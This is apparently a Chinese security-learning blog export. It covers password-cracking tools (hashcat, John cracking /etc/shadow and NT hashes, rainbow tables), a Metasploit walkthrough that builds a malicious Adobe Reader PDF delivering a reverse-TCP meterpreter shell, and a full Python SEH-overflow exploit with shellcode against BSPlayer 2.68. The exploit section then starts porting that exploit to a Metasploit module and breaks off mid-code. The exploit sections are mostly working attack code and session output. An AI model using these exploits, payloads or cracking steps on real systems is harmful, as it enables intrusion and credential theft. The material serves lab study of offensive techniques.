<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz　　 　　   [a-z]</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ　　       [A-Z]</span><br><span class="line">d | 0123456789　　                        [0-9]</span><br><span class="line">h | 0123456789abcdef　 　                 [0-9a-f]</span><br><span class="line">H | 0123456789ABCDEF　　                  [0-9A-F]</span><br><span class="line">s | !<span class="string">&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span></span><br><span class="line"><span class="string">a | ?l?u?d?s</span></span><br><span class="line"><span class="string">b | 0x00 - 0xff</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>常用命令</strong></li>
<li><strong>hashcat -b【测试当前CPU破解各种密码的速度】</strong></li>
<li><strong>hashcat -m 100 hash.dump pass.lst</strong></li>
<li><strong>hashcat -m 0 hash.txt a 3 ?l?l?l?l?l?l?l?l?d?d</strong></li>
<li><strong>结果：hashcat.pot</strong></li>
<li><strong>hashcat -m 100 a 3 hash i increment min 6 increment max 8 ?
l?l?l?l?l?l?l?l</strong></li>
</ul>
<p><strong>注，</strong> 可能会出现的报错：hashcat Device #1: Not enough
allocatable device memory for this
attack，修改kali虚拟机内核为单核，内存4G即可解决。</p>
<ul>
<li><strong>示例</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 4400 test.hash password.lst      <span class="comment">#4400 | md5(sha1($pass)) | Raw Hash salted and/or iterated</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911110352195-327720904.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911111633927-1199026413.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911111658602-1978878474.png" /></p>
<ul>
<li><strong>掩码示例</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/ temp]</span><br><span class="line">└─<span class="comment"># hashcat -m 4400 -a 3 test.hash -i --increment-min 4 --increment-max 6 ?d?d?d?d?d?d</span></span><br><span class="line">hashcat (v6.2.5) starting  </span><br><span class="line">………………………………</span><br><span class="line">afda1feb31ae9c3bff0ec654cefc20db:654321                                                                     </span><br><span class="line">………………………………</span><br></pre></td></tr></table></figure>
<h3 id="oclhashcat">5、oclhashcat</h3>
<ul>
<li><strong>号称世界上最快、基于</strong> <strong>GPGPU
的密码破解软件</strong></li>
<li><strong>免费开源、支持多平台、支持分布式、 170+hash
算法</strong></li>
<li><strong>硬件支持</strong></li>
<li><strong>虚拟机中无法使用</strong></li>
<li><strong>支持CUDA 技术的 Nvidia 显卡</strong></li>
<li><strong>支持OpenCL 技术 的 AMD 显卡</strong></li>
<li><strong>安装相应的驱动</strong></li>
<li><strong>限制</strong></li>
<li><strong>最大密码长度 55 字符</strong></li>
<li><strong>使用Unicode 的最大密码长度 27 字符</strong></li>
<li><strong>关于版本</strong></li>
<li><strong>oclHashcat-plus 、 oclHashcat-lite 已经合并为
oclhashcat</strong></li>
<li><strong>命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oclHashcat -m 0 hash.txt a 3 ?a?a?a?a?a?a?a</span><br><span class="line">?l = abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d = 0123456789</span><br><span class="line">?s = !<span class="string">&quot;#$%&amp;&#x27;()*+,-.:;/=&gt;?@[\]^_`~&#123;|&#125;~ </span></span><br><span class="line"><span class="string">?a = ?l?u?d?s</span></span><br><span class="line"><span class="string">?b = 0x00-0xff</span></span><br></pre></td></tr></table></figure>
<h3 id="rainbowcrack">6、RainbowCrack</h3>
<ul>
<li><strong>基于时间记忆权衡技术生成彩虹表</strong></li>
<li><strong>提前计算密码的 HASH 值，通过比对 HASH
值破解密码</strong></li>
<li><strong>计算HASH 的速度很慢，修改版支持 CUDA GPU</strong></li>
<li><strong>KALI中 包含的 RainbowCrack 工具</strong></li>
<li><strong>rtgen：预计算，生成彩虹表，耗时的阶段</strong></li>
<li><strong>rtsort：对 rtgen 生成的彩虹表进行排序</strong></li>
<li><strong>rcrack：查找彩虹表破解密码</strong></li>
<li><strong>以上命令必须顺序使用</strong></li>
<li><strong>彩虹表</strong></li>
<li><strong>密码明文、HASH 值、 HASH
算法、字符集、明文长度范围</strong></li>
<li><strong>rtgen</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage: </span><br><span class="line">rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</span><br><span class="line">rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>下载彩虹表</strong></li>
<li><a href="https://www.freerainbowtables.com/en/download"
class="uri">https://www.freerainbowtables.com/en/download</a></li>
<li><a href="https://ophcrack.sourceforge.io/tables.php"
class="uri">https://ophcrack.sourceforge.io/tables.php</a></li>
<li><a href="http://project-rainbowcrack.com/table.htm"
class="uri">http://project-rainbowcrack.com/table.htm</a></li>
<li><strong>彩虹表排序</strong></li>
<li><strong>/usr/share/rainbowcrack【rtgen生成的彩虹表位置】</strong></li>
<li><strong>rtsort path【指定彩虹表位置，不含表名】</strong></li>
<li><strong>密码破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage: </span><br><span class="line">./rcrack path [path] [...] -h <span class="built_in">hash</span></span><br><span class="line">./rcrack path [path] [...] -l hash_list_file</span><br><span class="line">./rcrack path [path] [...] -lm pwdump_file</span><br><span class="line">./rcrack path [path] [...] -ntlm pwdump_file</span><br><span class="line">path:              directory <span class="built_in">where</span> rainbow tables (*.rt, *.rtc) are stored</span><br><span class="line">-h <span class="built_in">hash</span>:           load single <span class="built_in">hash</span></span><br><span class="line">-l hash_list_file: load hashes from a file, each <span class="built_in">hash</span> <span class="keyword">in</span> a line</span><br><span class="line">-lm pwdump_file:   load lm hashes from pwdump file</span><br><span class="line">-ntlm pwdump_file: load ntlm hashes from pwdump file</span><br></pre></td></tr></table></figure>
<p><strong>示例</strong></p>
<ul>
<li><strong>生成彩虹表</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928174857868-525504489.png" /></p>
<ul>
<li><strong>排序</strong></li>
</ul>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928180228998-1641503803.png" /></strong></p>
<ul>
<li><strong>破解</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220928180251342-1069119808.png" /></p>
<h3 id="john">7、John</h3>
<ul>
<li>查看支持破解的加密类型：john --list=formats</li>
<li><strong>模式</strong></li>
<li><strong>Wordlist：基于规则的字典破解</strong></li>
<li><strong>Single crack ：默认被首先执行，使用 Login/GECOS
信息尝试破解</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929090456044-2104443828.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929090708911-1920887750.png" /></p>
<ul>
<li>注，密码不在passwd中，而在/etc/shadow中。</li>
<li>Incremental：所有或指定字符集的暴力破解</li>
<li>External：需要在主配配文件中用 C 语言子集编程</li>
<li><strong>默认破解模式</strong></li>
<li>Single--&gt;wordlist--&gt;incremental</li>
<li><strong>主配置文件【/etc/john/john.conf】中指定默认
wordlist</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929091024613-940611694.png" /></p>
<h4 id="破解linux-系统账号密码">（1）破解Linux 系统账号密码</h4>
<ul>
<li><strong>合并passwd和shadow</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt;test_pass.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929092424631-1739425895.png" /></p>
<ul>
<li><strong>破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john test_pass.txt    <span class="comment">#直接执行如果提示：No password hashes loaded (see FAQ)，加个--format=crypt，如下</span></span><br><span class="line">john --format=crypt test_pass.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929094122241-1103827089.png" /></p>
<ul>
<li><strong>查看已破解密码</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --show test_pass.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929094240862-234951999.png" /></p>
<ul>
<li><strong>已破解密码的保存文件</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929095308209-641121206.png" /></p>
<h4 id="破解windows-密码">（2）破解windows 密码</h4>
<ul>
<li><strong>用前面的方法提取个windows密码的hash来测试，示例：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929101630274-278013203.png" /></p>
<ul>
<li><strong>破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john sam.hash --wordlist=/usr/share/john/password.lst  --format=nt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102208777-658695823.png" /></p>
<ul>
<li><strong>查看已破解密码</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john sam.hash --format=nt --show</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102136558-1059335661.png" /></p>
<h4 id="johnny">（3）Johnny</h4>
<ul>
<li>图形化界面的 john</li>
<li>示例</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929102809780-1183196183.png" /></p>
<h3 id="ophcrack图形界面">8、Ophcrack【图形界面】</h3>
<ul>
<li>基于彩虹表的LM、NTLM 密码破解软件</li>
<li>彩虹表下载：<a
href="https://ophcrack.sourceforge.io/tables.php">http://ophcrack.sourceforge.net/tables.php</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220929103224713-2141941836.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>密码破解</category>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>基于文件格式的渗透攻击（ 以PDF 文件为例）</title>
    <url>/2021/12/07/%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%EF%BC%88%20%E4%BB%A5PDF%20%E6%96%87%E4%BB%B6%E4%B8%BA%E4%BE%8B%EF%BC%89/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：kali 2019.3</strong></p>
<p><strong>目标机：winXPSP3</strong></p>
<p><strong>漏洞</strong></p>
<ul>
<li><strong>软件版本 Adobe Reader 9</strong></li>
<li>影响到的版本 适用于Windows、 Macintosh和Unix的Adobe Reader
9.3.4及更早版本；</li>
<li>CVE描述渗透模块
http://www.adobe.com/support/security/advisories/apsa10-02.html</li>
<li>渗透模块的细节
/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</li>
</ul>
<h2 id="实验步骤">2. 实验步骤</h2>
<h3 id="创建恶意pdf文件msf.pdf">1、创建恶意PDF文件（msf.pdf）</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing </span><br><span class="line">    msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">    payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">    msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; show options </span><br><span class="line">    Module options (exploit/windows/fileformat/adobe_cooltype_sing):</span><br><span class="line">       Name      Current Setting  Required  Description</span><br><span class="line">       ----      ---------------  --------  -----------</span><br><span class="line">       FILENAME  msf.pdf          <span class="built_in">yes</span>       The file name.</span><br><span class="line">    Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">       Name      Current Setting  Required  Description</span><br><span class="line">       ----      ---------------  --------  -----------</span><br><span class="line">       EXITFUNC  process          <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">       LHOST                      <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">       LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line">       DisablePayloadHandler: True   (RHOST and RPORT settings will be ignored!)</span><br><span class="line">    Exploit target:</span><br><span class="line">       Id  Name</span><br><span class="line">       --  ----</span><br><span class="line">       0   Automatic</span><br><span class="line"> msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> lhost 10.10.10.155</span><br><span class="line">    lhost =&gt; 10.10.10.155 msf5 exploit(windows /fileformat/adobe_cooltype_sing) &gt;exploit</span><br><span class="line">    [*] Creating <span class="string">&#x27;msf.pdf&#x27;</span> file...</span><br><span class="line">    [+] msf.pdf stored at /root/.msf4/local/msf.pdf</span><br></pre></td></tr></table></figure>
<h3 id="将msf.pdf发送到靶机xp上">2、将msf.pdf发送到靶机(XP)上</h3>
<h3 id="kali-启动监听">3、kali 启动监听</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">    msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">    payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line"> msf5 exploit(multi/handler) &gt;show options </span><br><span class="line">    Module options (exploit/multi/handler):</span><br><span class="line">       Name  Current Setting  Required  Description</span><br><span class="line">       ----  ---------------  --------  -----------</span><br><span class="line">    Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">       Name      Current Setting  Required  Description</span><br><span class="line">       ----      ---------------  --------  -----------</span><br><span class="line">       EXITFUNC  process          <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">       LHOST                      <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">       LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line">    Exploit target:</span><br><span class="line">       Id  Name</span><br><span class="line">       --  ----</span><br><span class="line">       0   Wildcard Target</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.10.155</span><br><span class="line">    lhost =&gt; 10.10.10.155 msf5 exploit(multi /handler) &gt;exploit</span><br><span class="line">    [*] Started reverse TCP handler on 10.10.10.155:4444 </span><br></pre></td></tr></table></figure>
<h3 id="xp打开msf.pdf">4、XP打开msf.pdf</h3>
<h3 id="kali-获得meterpreter">5、kali 获得meterpreter</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt;exploit</span><br><span class="line">        </span><br><span class="line">        [*] Started reverse TCP handler on 10.10.10.155:4444 </span><br><span class="line">        [*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">        [*] Meterpreter session 1 opened (10.10.10.155:4444 -&gt; 10.10.10.131:1190) at 2021-10-06 03:08:51 -0400 meterpreter &gt;getuid</span><br><span class="line">        Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">    meterpreter&gt;<span class="built_in">ls</span></span><br><span class="line">        Listing: C:\Documents and Settings\Administrator</span><br><span class="line">        ================================================</span><br><span class="line">        </span><br><span class="line">        Mode              Size     Type  Last modified              Name</span><br><span class="line">        ----              ----     ----  -------------              ----</span><br><span class="line">        40777/rwxrwxrwx   0        <span class="built_in">dir</span>   2021-09-29 08:57:48 -0400  .idlerc</span><br><span class="line">        40555/r-xr-xr-x   0        <span class="built_in">dir</span>   2011-08-14 01:41:33 -0400  Application Data</span><br><span class="line">        40777/rwxrwxrwx   0        <span class="built_in">dir</span>   2011-08-14 01:41:33 -0400  Cookies</span><br><span class="line">        40777/rwxrwxrwx   0        <span class="built_in">dir</span>   2011-08-14 01:41:33 -0400  Desktop</span><br><span class="line">        …………</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>将 TCP 服务端/基于浏览器的渗透模块导入 Metasploit</title>
    <url>/2021/12/04/%E5%B0%86%20TCP%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%20Metasploit/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：</strong></p>
<p><strong>kali 2019-3 (10.10.10.153)</strong></p>
<p><strong>靶机环境：</strong></p>
<p><strong>Windows XP Professional 1 (10.10.10.132)</strong></p>
<p><strong>漏洞：</strong></p>
<p><strong>BSplayer 2.68，下载：<a
href="https://www.exploit-db.com/exploits/36477/"
class="uri">https://www.exploit-db.com/exploits/36477/</a></strong></p>
<p><strong>漏洞源于对远程服务器响应的解析</strong></p>
<h2 id="python实现渗透">2. python实现渗透</h2>
<h3 id="python渗透代码">1、python渗透代码：</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.</span></span><br><span class="line"><span class="string">In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full</span></span><br><span class="line"><span class="string">address and then used backward jumping to jump to a long jump that eventually land in my shellcode.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">My twitter: @fady_osman</span></span><br><span class="line"><span class="string">My youtube: https://www.youtube.com/user/cutehack3r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = socket.socket()         <span class="comment"># Create a socket object</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>):</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[x] Please enter an IP and port to listen to.&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[x] &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; ip port&quot;</span></span><br><span class="line">  exit()</span><br><span class="line">host = sys.argv[<span class="number">1</span>]<span class="comment"># Ip to listen to.</span></span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])     <span class="comment"># Reserve a port for your service.</span></span><br><span class="line">s.bind((host, port))        <span class="comment"># Bind to the port</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Listening on port &quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">s.listen(<span class="number">5</span>)                 <span class="comment"># Now wait for client connection.</span></span><br><span class="line">c, addr = s.accept()        <span class="comment"># Establish connection with client.</span></span><br><span class="line"><span class="comment"># Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.</span></span><br><span class="line"><span class="built_in">print</span>((<span class="string">&#x27;[*] Sending the payload first time&#x27;</span>, addr))</span><br><span class="line">c.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment">#seh and nseh.</span></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x8c\xcd\x11\xc2\x37\x12&quot;</span></span><br><span class="line"></span><br><span class="line">jmplong = <span class="string">&quot;\xe9\x85\xe9\xff\xff&quot;</span></span><br><span class="line">nseh = <span class="string">&quot;\xeb\xf9\x90\x90&quot;</span></span><br><span class="line"><span class="comment"># Partially overwriting the seh record (nulls are ignored).</span></span><br><span class="line">seh = <span class="string">&quot;\x3b\x58\x00\x00&quot;</span></span><br><span class="line">buflen = <span class="built_in">len</span>(buf)</span><br><span class="line">response = <span class="string">&quot;\x90&quot;</span> *<span class="number">2048</span> + buf + <span class="string">&quot;\xcc&quot;</span> * (<span class="number">6787</span> - <span class="number">2048</span> - buflen) + jmplong + nseh + seh <span class="comment">#+ &quot;\xcc&quot; * 7000</span></span><br><span class="line">c.send(response)</span><br><span class="line">c.close()</span><br><span class="line">c, addr = s.accept()<span class="comment"># Establish connection with client.</span></span><br><span class="line"><span class="comment"># Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.</span></span><br><span class="line"><span class="built_in">print</span>((<span class="string">&#x27;[*] Sending the payload second time&#x27;</span>, addr))</span><br><span class="line">c.recv(<span class="number">1024</span>)</span><br><span class="line">c.send(response)</span><br><span class="line">c.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<h3 id="代码简要分析">2、代码简要分析：</h3>
<ul>
<li>编写者将ShellCode放置在了2048个NOP之后，不过这并不意味着实际偏移量就是2048----将它放置在SEH覆盖区的前面是因为必须要给ShellCode保留足够的空间。</li>
<li>，但是在这个渗透模块中，它被用来实现填充</li>
<li>变量jmplong中存储了到ShellCode的向后跳转。</li>
<li>nseh变量中存储了下一帧的地址，也就是我们在上一章中讨论过的短跳转。</li>
<li>seh变量中保存了P/P/R指令序列的地址。</li>
</ul>
<h3 id="测试">3、测试</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204203501140-1925349535.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204203513970-1719555073.png" /></p>
<ul>
<li><strong>弹出计算器即成功！</strong></li>
</ul>
<h2 id="创建-metasploit-模块">3. 创建 Metasploit 模块</h2>
<h3 id="渗透所需信息">1、渗透所需信息</h3>
<p><strong>偏移量 2048</strong></p>
<p><strong>已知POP-POP-RETN系列指令/P-P-R在内存中的地址
0x0000583b</strong></p>
<p>**向后跳转/到ShellCode的长跳转 *</p>
<p><strong>短跳转/指向下一个SEH帧的指针 </strong></p>
<p><strong>注意点</strong></p>
<p>有一点必须要指出：在当前情景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标的请求之后，要向其发送恶意的内容。</p>
<h3 id="渗透代码">2、渗透代码</h3>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">NormalRanking</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::TcpServer</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&quot;BsPlayer 2.68 SEH Overflow Exploit&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">      Here&#x27;s an example of Server Based Exploit</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; [ <span class="string">&#x27;z9m8r8&#x27;</span> ],</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">      [</span><br><span class="line">        [ <span class="string">&#x27;Generic&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x0000583b</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">2048</span>&#125; ],</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span> =&gt;</span><br><span class="line">      &#123;</span><br><span class="line"><span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\x0a\x20\x0d&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;10 19 2021&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">on_client_connect</span>(<span class="params">client</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">if</span> ((p = regenerate_payload(client)) == <span class="literal">nil</span>)</span><br><span class="line">    print_status(<span class="string">&quot;Client Connected&quot;</span>)</span><br><span class="line">    sploit = make_nops(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    sploit &lt;&lt; payload.encoded</span><br><span class="line">    sploit &lt;&lt; <span class="string">&quot;\xcc&quot;</span> * (<span class="number">6787</span>-<span class="number">2048</span> - payload.encoded.length)</span><br><span class="line">    sploit &lt;&lt; <span class="string">&quot;\xe9\x85\xe9\xff\xff&quot;</span></span><br><span class="line">    sploit &lt;&lt; <span class="string">&quot;\xeb\xf9\x90\x90&quot;</span></span><br><span class="line">    sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">    client.put(sploit)</span><br><span class="line">    client.get_once</span><br><span class="line">    client.put(sploit)</span><br><span class="line">    handler(client)</span><br><span class="line">    service.close_client(client)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span 